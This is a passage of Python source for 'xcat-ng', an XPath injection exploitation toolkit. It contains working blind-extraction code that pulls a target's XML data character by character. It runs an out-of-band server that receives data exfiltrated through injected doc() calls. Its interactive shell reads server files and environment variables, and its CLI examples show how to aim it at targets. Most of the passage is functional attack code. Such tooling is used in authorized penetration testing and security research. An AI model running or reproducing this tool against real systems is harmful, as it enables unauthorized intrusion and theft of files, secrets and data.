        # Build priority charset from common characters
        top = [c for c, _ in self.common_chars.most_common()]
        search = top + [c for c in self.charset if c not in top]

        for ch in search:
            q = '"' if ch == "'" else "'"
            condition = f"{expression}={q}{ch}{q}"

            if self.mode == Mode.AGGRESSIVE:
                if await self.oracle.ask(condition):
                    self.common_chars[ch] += 1
                    return ch
            else:
                votes = sum(1 for _ in range(MAX_RETRIES) if await asyncio.ensure_future(self.oracle.ask(condition)))
                if votes >= 2:
                    self.common_chars[ch] += 1
                    return ch

        return MISSING_CHAR

    async def get_char(self, expression: str) -> str:
        """Get a single character using the best available method."""
        if self.features.get("codepoint-search"):
            result = await self.get_char_codepoint(expression)
            if result:
                self.common_chars[result] += 1
                return result
        if self.features.get("substring-search"):
            result = await self.get_char_substring(expression)
            if result:
                self.common_chars[result] += 1
                return result
        return await self.get_char_bruteforce(expression)

    # ── string extraction ─────────────────────────────────────────────────

    async def get_string(
        self,
        expression: str,
        progress: Optional[Progress] = None,
        task_id: Optional[int] = None,
        label: str = "",
        normalize: bool = True,
    ) -> str:
        """Extract a full string via the oracle."""
        if normalize and self.features.get("normalize-space"):
            expression = f"normalize-space({expression})"

        length = await self.get_string_length(expression)
        if length <= 0:
            return ""

        # Try common strings first (for short node names)
        if length <= 10:
            common = [s for s, _ in self.common_strings.most_common() if len(s) == length][:5]
            for candidate in common:
                if await self.oracle.ask(f"{expression}='{candidate}'"):
                    self.common_strings[candidate] += 1
                    return candidate

        result = [MISSING_CHAR] * length

        async def fetch_char(pos: int):
            async with self._sem:
                ch = await self.get_char(f"substring({expression},{pos},1)")
                result[pos - 1] = ch
                if progress and task_id is not None:
                    progress.advance(task_id)

        tasks = [fetch_char(i) for i in range(1, length + 1)]
        await asyncio.gather(*tasks)

        final = "".join(result)
        if length <= 10:
            self.common_strings[final] += 1
        return final


# ═══════════════════════════════════════════════════════════════════════════════
# XML Tree Extraction (blind)
# ═══════════════════════════════════════════════════════════════════════════════

async def extract_xml_tree(
    extractor: BlindExtractor,
    xpath: str = "/*[1]",
    depth: int = 0,
    max_depth: int = 15,
    progress: Optional[Progress] = None,
    task_id: Optional[int] = None,
    state: Optional[ExtractionState] = None,
    save_path: Optional[str] = None,
) -> XmlNode:
    """Recursively extract the full XML tree via blind oracle."""

    # Resume check
    if state and xpath in state.partial:
        cached = json.loads(state.partial[xpath])
        node = XmlNode(name=cached["name"], value=cached.get("value"))
        if progress and task_id is not None:
            progress.advance(task_id)
        return node

    # Get node name
    name = await extractor.get_string(f"name({xpath})", progress=progress, task_id=task_id, label=f"name({xpath})")
    if not name:
        name = "unknown"

    node = XmlNode(name=name)

    if progress and task_id is not None:
        progress.console.print(f"  [dim]{'  ' * depth}[/dim][cyan]<{name}>[/cyan] @ {xpath}")

    # Get attributes
    attr_count = await extractor.get_count(f"{xpath}/@*")
    for i in range(1, attr_count + 1):
        attr_name = await extractor.get_string(f"name({xpath}/@*[{i}])", progress=progress, task_id=task_id)
        attr_val = await extractor.get_string(f"{xpath}/@*[{i}]", progress=progress, task_id=task_id)
        node.attributes[attr_name] = attr_val

    # Get comments
    comment_count = await extractor.get_count(f"{xpath}/comment()")
    for i in range(1, comment_count + 1):
        cmt = await extractor.get_string(f"{xpath}/comment()[{i}]", progress=progress, task_id=task_id)
        node.comments.append(cmt)

    # Count children
    child_count = await extractor.get_count(f"{xpath}/*")

    if child_count == 0 or depth >= max_depth:
        # Leaf node — get text content
        text = await extractor.get_string(xpath, progress=progress, task_id=task_id)
        node.value = text
    else:
        # Get text content of this node too (mixed content)
        text_count = await extractor.get_count(f"{xpath}/text()")
        if text_count > 0:
            texts = []
            for ti in range(1, text_count + 1):
                t = await extractor.get_string(f"{xpath}/text()[{ti}]", progress=progress, task_id=task_id, normalize=False)
                texts.append(t)
            node.value = "".join(texts) if texts else None

        # Recurse children
        for i in range(1, child_count + 1):
            child_xpath = f"{xpath}/*[{i}]"
            child = await extract_xml_tree(
                extractor, child_xpath, depth + 1, max_depth,
                progress, task_id, state, save_path,
            )
            node.children.append(child)

    # Save state
    if state and save_path:
        state.partial[xpath] = json.dumps({"name": node.name, "value": node.value})
        state.save(save_path)

    if progress and task_id is not None:
        progress.advance(task_id)

    return node


# ═══════════════════════════════════════════════════════════════════════════════
# OOB (Out-of-Band) HTTP Server
# ═══════════════════════════════════════════════════════════════════════════════

class OOBServer:
    """Simple OOB HTTP data exfiltration server using aiohttp."""

    def __init__(self, host: str, port: int):
        if not HAS_AIOHTTP:
            raise RuntimeError("aiohttp required for OOB server: pip install aiohttp")
        self.host = host
        self.port = port
        self.test_value = str(random.randint(1, 1000000))
        self.expectations: dict[str, asyncio.Future] = {}
        self.entity_values: dict[str, str] = {}
        self._runner: Optional[aio_web.AppRunner] = None
        self.app: Optional[aio_web.Application] = None

    def _create_app(self) -> aio_web.Application:
        app = aio_web.Application()
        app.router.add_get("/test/data", self._handle_test)
        app.router.add_get("/test/entity", self._handle_test_entity)
        app.router.add_get("/data/{id}", self._handle_data)
        app.router.add_get("/entity/{id}", self._handle_entity)
        app["server"] = self
        return app

    async def _handle_test(self, request: aio_web.Request):
        return aio_web.Response(
            body=f"<data>{self.test_value}</data>",
            content_type="text/xml",
        )

    async def _handle_test_entity(self, request: aio_web.Request):
        tmpl = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE stuff [<!ELEMENT data ANY><!ENTITY goodies "{self.test_value}">]>'
            "<data>&goodies;</data>"
        )
        return aio_web.Response(body=tmpl, content_type="text/xml")

    async def _handle_data(self, request: aio_web.Request):
        eid = request.match_info["id"]
        if eid not in self.expectations:
            return aio_web.Response(status=404)
        data = unquote(request.rel_url.query_string[2:]) if request.rel_url.query_string.startswith("d=") else ""
        fut = self.expectations[eid]
        if not fut.done():
            fut.set_result(data)
        return aio_web.Response(
            body=f"<data>{self.test_value}</data>",
            content_type="text/xml",
        )

    async def _handle_entity(self, request: aio_web.Request):
        eid = request.match_info["id"]
        if eid not in self.entity_values:
            return aio_web.Response(status=404)
        val = self.entity_values[eid]
        tmpl = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE stuff [<!ELEMENT data ANY><!ENTITY goodies {val}>]>'
            "<data>&goodies;</data>"
        )
        return aio_web.Response(body=tmpl, content_type="text/xml")

    def expect_data(self) -> Tuple[str, asyncio.Future]:
        eid = str(len(self.expectations))
        fut: asyncio.Future = asyncio.get_event_loop().create_future()
        self.expectations[eid] = fut
        return eid, fut

    def expect_entity(self, entity_value: str) -> Tuple[str, asyncio.Future]:
        eid, fut = self.expect_data()
        self.entity_values[eid] = entity_value
        return eid, fut

    async def start(self):
        self.app = self._create_app()
        self._runner = aio_web.AppRunner(self.app)
        await self._runner.setup()
        site = aio_web.TCPSite(self._runner, "0.0.0.0", self.port)
        await site.start()
        console.print(f"  [green]✓[/green] OOB server listening on [bold]0.0.0.0:{self.port}[/bold]")

    async def stop(self):
        if self._runner:
            await self._runner.cleanup()

    @property
    def base_url(self) -> str:
        return f"http://{self.host}:{self.port}"


async def get_string_via_oob(
    oracle: BaseOracle,
    oob: OOBServer,
    expression: str,
) -> Optional[str]:
    """Retrieve a string via OOB doc() exfiltration."""
    eid, future = oob.expect_data()
    url = f"{oob.base_url}/data/{eid}?d="
    oob_expr = f"doc(concat('{url}',encode-for-uri({expression})))/data='{oob.test_value}'"
    if not await oracle.ask(oob_expr):
        return None
    try:
        return await asyncio.wait_for(future, timeout=5)
    except asyncio.TimeoutError:
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# Interactive Shell
# ═══════════════════════════════════════════════════════════════════════════════

class ShellCommand:
    name: str = ""
    help_text: str = ""
    aliases: list[str] = []
    args_desc: list[str] = []
    required_features: frozenset[str] = frozenset()

    def __init__(self, ctx: "ShellContext"):
        self.ctx = ctx

    async def run(self, args: list[str]):
        raise NotImplementedError


class ShellContext:
    """Holds state for the interactive shell."""

    def __init__(
        self,
        oracle: BaseOracle,
        extractor: BlindExtractor,
        features: dict[str, bool],
        oob: Optional[OOBServer] = None,
    ):
        self.oracle = oracle
        self.extractor = extractor
        self.features = features
        self.oob = oob


class CmdHelp(ShellCommand):
    name = "help"
    help_text = "Show available commands"

    async def run(self, args):
        table = Table(title="Available Commands", box=box.SIMPLE)
        table.add_column("Command", style="green")
        table.add_column("Args", style="yellow")
        table.add_column("Description")
        for cls in ShellCommand.__subclasses__():
            a = " ".join(f"[{x}]" for x in cls.args_desc)
            table.add_row(cls.name, a, cls.help_text)
        console.print(table)


class CmdExit(ShellCommand):
    name = "exit"
    help_text = "Exit the shell"

    async def run(self, args):
        raise SystemExit(0)


class CmdGet(ShellCommand):
    name = "get"
    help_text = "Extract a subtree by XPath"
    args_desc = ["xpath"]

    async def run(self, args):
        if not args:
            console.print("[red]Usage: get <xpath>[/red]")
            return
        xpath = args[0]
        with Progress(
            SpinnerColumn(), TextColumn("[bold blue]Extracting..."),
            BarColumn(), TimeElapsedColumn(), console=console,
        ) as progress:
            task = progress.add_task("extract", total=None)
            node = await extract_xml_tree(self.ctx.extractor, xpath, progress=progress, task_id=task)
        console.print(Syntax(node.to_xml(), "xml", theme="monokai"))


class CmdGetString(ShellCommand):
    name = "get-string"
    help_text = "Evaluate an XPath string expression"
    args_desc = ["expression"]

    async def run(self, args):
        if not args:
            console.print("[red]Usage: get-string <expression>[/red]")
            return
        result = await self.ctx.extractor.get_string(args[0])
        console.print(f"[cyan]{result}[/cyan]")


class CmdCount(ShellCommand):
    name = "count"
    help_text = "Count nodes matching an expression"
    args_desc = ["expression"]

    async def run(self, args):
        if not args:
            console.print("[red]Usage: count <expression>[/red]")
            return
        c = await self.ctx.extractor.get_count(args[0])
        console.print(f"[cyan]{c}[/cyan]")


class CmdCheck(ShellCommand):
    name = "check"
    help_text = "Test a boolean XPath condition"
    args_desc = ["condition"]

    async def run(self, args):
        if not args:
            console.print("[red]Usage: check <condition>[/red]")
            return
        r = await self.ctx.oracle.ask(args[0])
        color = "green" if r else "red"
        console.print(f"[{color}]{r}[/{color}]")


class CmdPwd(ShellCommand):
    name = "pwd"
    help_text = "Get working directory / document URI"
    required_features = frozenset({"document-uri", "base-uri"})

    async def run(self, args):
        if self.ctx.features.get("base-uri"):
            expr = "base-uri()"
        else:
            expr = "document-uri(/)"
        result = await self.ctx.extractor.get_string(expr)
        console.print(f"[cyan]{result}[/cyan]")


class CmdCat(ShellCommand):
    name = "cat"
    help_text = "Read a text file (requires unparsed-text)"
    args_desc = ["path"]
    required_features = frozenset({"unparsed-text"})

    async def run(self, args):
        if not args:
            console.print("[red]Usage: cat <file_path>[/red]")
            return
        path = args[0]
        avail = await self.ctx.oracle.ask(f"unparsed-text-available('{path}')")
        if not avail:
            console.print(f"[yellow]File {path} may not be available[/yellow]")
        expr = f"unparsed-text-lines('{path}')"
        count = await self.ctx.extractor.get_count(expr)
        console.print(f"[dim]Lines: {count}[/dim]")
        for i in range(1, count + 1):
            line = await self.ctx.extractor.get_string(f"unparsed-text-lines('{path}')[{i}]", normalize=False)
            console.print(line)


class CmdEnv(ShellCommand):
    name = "env"
    help_text = "Read environment variables (XPath 3.0)"
    required_features = frozenset({"environment-variables"})

    async def run(self, args):
        expr = "available-environment-variables()"
        total = await self.ctx.extractor.get_count(expr)
        for i in range(1, total + 1):
            name = await self.ctx.extractor.get_string(f"available-environment-variables()[{i}]")
            value = await self.ctx.extractor.get_string(f"environment-variable(available-environment-variables()[{i}])")
            console.print(f"[green]{name}[/green]=[cyan]{value}[/cyan]")


class CmdTime(ShellCommand):
    name = "time"
    help_text = "Get server date/time"
    required_features = frozenset({"current-datetime"})

    async def run(self, args):
        result = await self.ctx.extractor.get_string("string(current-dateTime())")
        console.print(f"[cyan]{result}[/cyan]")


class CmdFind(ShellCommand):
    name = "find"
    help_text = "Find a file by name in parent directories"
    args_desc = ["filename"]
    required_features = frozenset({"doc-function"})

    async def run(self, args):
        if not args:
            console.print("[red]Usage: find <filename>[/red]")
            return
        name = args[0]
        for i in range(10):
            rel = ("../" * i) + name
            console.print(f"[dim]Searching: {rel}[/dim]")
            expr = f"resolve-uri('{rel}',document-uri(/))"
            if await self.ctx.oracle.ask(f"doc-available({expr})"):
                console.print(f"  [green]✓ XML file available: {rel}[/green]")
            elif self.ctx.features.get("unparsed-text"):
                if await self.ctx.oracle.ask(f"unparsed-text-available({expr})"):
                    console.print(f"  [green]✓ Text file available: {rel}[/green]")


class CmdFeatures(ShellCommand):
    name = "features"
    help_text = "Show detected features"

    async def run(self, args):
        for feat, enabled in self.ctx.features.items():
            color = "green" if enabled else "red"
            console.print(f"  {feat}: [{color}]{enabled}[/{color}]")


class CmdToggle(ShellCommand):
    name = "toggle"
    help_text = "Toggle a feature on/off"
    args_desc = ["feature_name"]

    async def run(self, args):
        if not args:
            await CmdFeatures(self.ctx).run([])
            return
        feat = args[0]
        self.ctx.features[feat] = not self.ctx.features.get(feat, False)
        console.print(f"  {feat} → [bold]{'on' if self.ctx.features[feat] else 'off'}[/bold]")


async def run_shell(shell_ctx: ShellContext):
    """Interactive XPath exploitation shell."""
    commands: dict[str, ShellCommand] = {}
    for cls in ShellCommand.__subclasses__():
        cmd = cls(shell_ctx)
        commands[cls.name] = cmd
        for alias in getattr(cls, "aliases", []):
            commands[alias] = cmd

    if HAS_PROMPT_TOOLKIT:
        data_dir = Path.home() / ".xcat_ng"
        data_dir.mkdir(exist_ok=True)
        session: PromptSession = PromptSession(history=FileHistory(str(data_dir / "history")))
        completer = WordCompleter(list(commands.keys()))

        while True:
            try:
                user_input = await session.prompt_async(
                    "xcat-ng> ",
                    completer=completer,
                    auto_suggest=AutoSuggestFromHistory(),
                )
            except (EOFError, KeyboardInterrupt):
                break

            parts = shlex.split(user_input) if user_input.strip() else []
            if not parts:
                continue
            name, args = parts[0], parts[1:]
            if name not in commands:
                console.print(f"[red]Unknown command: {name}. Type 'help'.[/red]")
                continue
            cmd = commands[name]
            if cmd.required_features and not any(shell_ctx.features.get(f) for f in cmd.required_features):
                console.print(f"[red]Missing required features: {', '.join(cmd.required_features)}[/red]")
                continue
            try:
                await cmd.run(args)
            except SystemExit:
                return
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]")
    else:
        console.print("[yellow]prompt_toolkit not installed. Using basic input.[/yellow]")
        while True:
            try:
                user_input = input("xcat-ng> ")
            except (EOFError, KeyboardInterrupt):
                break
            parts = shlex.split(user_input) if user_input.strip() else []
            if not parts:
                continue
            name, args = parts[0], parts[1:]
            if name not in commands:
                console.print(f"[red]Unknown command: {name}[/red]")
                continue
            try:
                await commands[name].run(args)
            except SystemExit:
                return
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI Argument Parser
# ═══════════════════════════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="xcat-ng — Modern XPath Injection Exploitation Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Burp request mode — auto-detect everything
  %(prog)s -r request.txt

  # Burp request, specify vulnerable param, match true by string
  %(prog)s -r request.txt -p username --true-string "Welcome"

  # Manual mode
  %(prog)s -u "http://target/search?q=test&id=1" --true-string "results"

  # Manual POST
  %(prog)s -u "http://target/login" -X POST -d "user=admin&pass=test" --true-code 200

  # With OOB server for fast retrieval
  %(prog)s -r request.txt --oob 1.2.3.4:9090

  # Interactive shell
  %(prog)s -r request.txt --shell
""",
    )

    source = p.add_argument_group("Request Source")
    source.add_argument("-r", "--request", metavar="FILE", help="Burp Suite raw request file")
    source.add_argument("-u", "--url", help="Target URL (manual mode)")
    source.add_argument("-X", "--method", default="GET", help="HTTP method (default: GET)")
    source.add_argument("-d", "--data", help="POST body (application/x-www-form-urlencoded)")
    source.add_argument("--json-body", help="POST body (application/json)")
    source.add_argument("-H", "--header", action="append", metavar="H", help="Custom header (Key: Value)")
    source.add_argument("--https", action="store_true", help="Force HTTPS scheme (Burp mode)")

    detection = p.add_argument_group("Detection")
    detection.add_argument("-p", "--param", metavar="NAME", help="Vulnerable parameter name (skip auto-discovery)")
    detection.add_argument("--tech", choices=[t.value for t in Technique], default="auto",
                           help="Injection technique (default: auto)")
    detection.add_argument("--true-string", metavar="S",
                           help="String indicating true response (prefix ! to negate)")
    detection.add_argument("--true-code", metavar="CODE",
                           help="Status code indicating true response (prefix ! to negate)")

    engine = p.add_argument_group("Engine")
    engine.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    engine.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help=f"Request timeout (default: {DEFAULT_TIMEOUT})")
    engine.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Delay between requests (seconds)")
    engine.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY,
                        help=f"Concurrent requests (default: {DEFAULT_CONCURRENCY})")
    engine.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    engine.add_argument("--mode", choices=[m.value for m in Mode], default="safe",
                        help="Extraction mode: safe (voting) or aggressive (fast, less reliable)")

    output = p.add_argument_group("Output & Actions")
    output.add_argument("--shell", action="store_true", help="Launch interactive exploitation shell")
    output.add_argument("--detect-only", action="store_true", help="Only detect injection & features, don't extract")
    output.add_argument("--oob", metavar="IP:PORT", help="Start OOB exfiltration server (e.g. 1.2.3.4:9090)")
    output.add_argument("--max-depth", type=int, default=15, help="Max XML tree depth (default: 15)")
    output.add_argument("--resume", metavar="FILE", help="Resume from saved state file")
    output.add_argument("--save-state", metavar="FILE", help="Save extraction state for resume")
    output.add_argument("-o", "--output", metavar="FILE", help="Save extracted XML to file")

    p.add_argument("--version", action="version", version=f"xcat-ng {VERSION}")

    return p


# ═══════════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    console.print(BANNER)

    parser = build_parser()
    args = parser.parse_args()

    if not args.request and not args.url:
        parser.error("Either -r/--request or -u/--url is required")

    # ── Parse request ─────────────────────────────────────────────────────
    if args.request:
        console.print(f"[bold]Loading Burp request:[/bold] {args.request}")
        try:
            parsed = parse_burp_request(args.request, force_https=args.https)
        except Exception as e:
            console.print(f"[red]Error parsing request file: {e}[/red]")
            sys.exit(1)
    else:
        parsed = build_manual_request(
            url=args.url,
            method=args.method,
            data=args.data,
            headers=args.header,
            json_body=args.json_body,
        )

    # Display parsed info
    info_table = Table(box=box.ROUNDED, show_header=False, padding=(0, 1))
    info_table.add_column(style="bold")
    info_table.add_column()
    info_table.add_row("Target", parsed.url)
    info_table.add_row("Method", parsed.method)
    if parsed.query_params:
        info_table.add_row("Query params", ", ".join(f"{k}={v}" for k, v in parsed.query_params.items()))
    if parsed.body_params:
        info_table.add_row("Body params", ", ".join(f"{k}={v}" for k, v in parsed.body_params.items()))
    if parsed.headers:
        info_table.add_row("Headers", str(len(parsed.headers)) + " custom headers")

    console.print(Panel(info_table, title="[bold]Request Info[/bold]", border_style="blue"))

    if not parsed.all_params:
        console.print("[red]No parameters found in request. Nothing to test.[/red]")
        sys.exit(1)

    # ── Engine config ─────────────────────────────────────────────────────
    config = EngineConfig(
        timeout=args.timeout,
        delay=args.delay,
        concurrency=args.concurrency,
        proxy=args.proxy,
        verify_ssl=not args.insecure,
        mode=Mode(args.mode),
    )

    engine = HTTPEngine(parsed, config)

    console.print()
    console.print(f"[bold]Settings:[/bold] mode={config.mode.value}, concurrency={config.concurrency}, timeout={config.timeout}s")

    # ── OOB Server ────────────────────────────────────────────────────────
    oob_server: Optional[OOBServer] = None
    if args.oob:
        try:
            oob_host, oob_port = args.oob.split(":", 1)
            oob_server = OOBServer(oob_host, int(oob_port))
            await oob_server.start()
        except Exception as e:
            console.print(f"[red]Failed to start OOB server: {e}[/red]")

    # ── Match function ────────────────────────────────────────────────────
    match_fn = make_match_function(args.true_code, args.true_string)

    # ── Detection ─────────────────────────────────────────────────────────
    console.print()
    console.print("[bold]▸ Phase 1: Injection Detection[/bold]")

    technique, oracle, extra_info = await auto_detect(
        engine, parsed.all_params, Technique(args.tech),
        match_fn=match_fn,
        target_param=args.param,
        config=config,
    )

    if technique is None:
        console.print("[red]✗ No injectable parameter detected.[/red]")
        console.print("[dim]  Hints: try specifying --true-string or --true-code, "
                      "or manually set -p <param>.[/dim]")
        await engine.close()
        sys.exit(1)

    console.print(f"\n[green]✓ Technique:[/green] [bold]{technique.value.upper()}[/bold]")
    console.print(f"[green]  Total requests (detection):[/green] {engine.request_count}")

    # ── Feature detection ─────────────────────────────────────────────────
    features: dict[str, bool] = {}
    if oracle and technique in (Technique.BOOLEAN, Technique.TIME):
        console.print()
        console.print("[bold]▸ Phase 2: Feature Detection[/bold]")
        features = await detect_features(oracle)
        feat_table = Table(box=box.SIMPLE, show_header=False)
        feat_table.add_column("Feature", style="bold")
        feat_table.add_column("Available")
        for feat, avail in features.items():
            color = "green" if avail else "dim red"
            feat_table.add_row(feat, f"[{color}]{avail}[/{color}]")
        console.print(feat_table)

    if args.detect_only:
        console.print("\n[bold green]Detection complete.[/bold green]")
        await engine.close()
        if oob_server:
            await oob_server.stop()
        return

    # ── Extraction ────────────────────────────────────────────────────────
    console.print()

    if technique == Technique.NORMAL and extra_info:
        console.print("[bold]▸ Phase 3: Normal (Union-based) Extraction[/bold]")
        nodes = await normal_extract(engine, extra_info)
        console.print()
        console.print(Panel("[bold]Extracted Data[/bold]", border_style="green"))
        for node in nodes:
            console.print(f"  [cyan]{node.name}[/cyan] = [white]{node.value}[/white]")

    elif oracle:
        # Shell mode
        if args.shell:
            console.print("[bold]▸ Interactive Shell[/bold]")
            extractor = BlindExtractor(oracle, features, config.concurrency, mode=config.mode)
            shell_ctx = ShellContext(oracle, extractor, features, oob_server)
            await run_shell(shell_ctx)
        else:
            # Full XML extraction
            console.print("[bold]▸ Phase 3: Blind XML Extraction[/bold]")

            extractor = BlindExtractor(oracle, features, config.concurrency, mode=config.mode)

            # Load resume state
            state: Optional[ExtractionState] = None
            if args.resume and Path(args.resume).exists():
                state = ExtractionState.load(args.resume)
                console.print(f"  [dim]Resumed from {args.resume} ({len(state.partial)} cached nodes)[/dim]")
            elif args.save_state:
                state = ExtractionState()

            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}"),
                BarColumn(bar_width=40),
                TaskProgressColumn(),
                MofNCompleteColumn(),
                TimeElapsedColumn(),
                console=console,
                expand=False,
            ) as progress:
                task = progress.add_task("Extracting XML tree...", total=None)
                root = await extract_xml_tree(
                    extractor, "/*[1]",
                    max_depth=args.max_depth,
                    progress=progress,
                    task_id=task,
                    state=state,
                    save_path=args.save_state,
                )

            xml_output = '<?xml version="1.0" encoding="UTF-8"?>\n' + root.to_xml()

            console.print()
            console.print(Panel(
                Syntax(xml_output, "xml", theme="monokai", line_numbers=True),
                title="[bold green]Extracted XML[/bold green]",
                border_style="green",
                expand=True,
            ))

            if args.output:
                Path(args.output).write_text(xml_output, encoding="utf-8")
                console.print(f"\n[green]✓ Saved to {args.output}[/green]")

    # ── Cleanup ───────────────────────────────────────────────────────────
    console.print(f"\n[dim]Total HTTP requests: {engine.request_count}[/dim]")
    await engine.close()
    if oob_server:
        await oob_server.stop()


# ═══════════════════════════════════════════════════════════════════════════════
# Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted.[/yellow]")
        sys.exit(130)
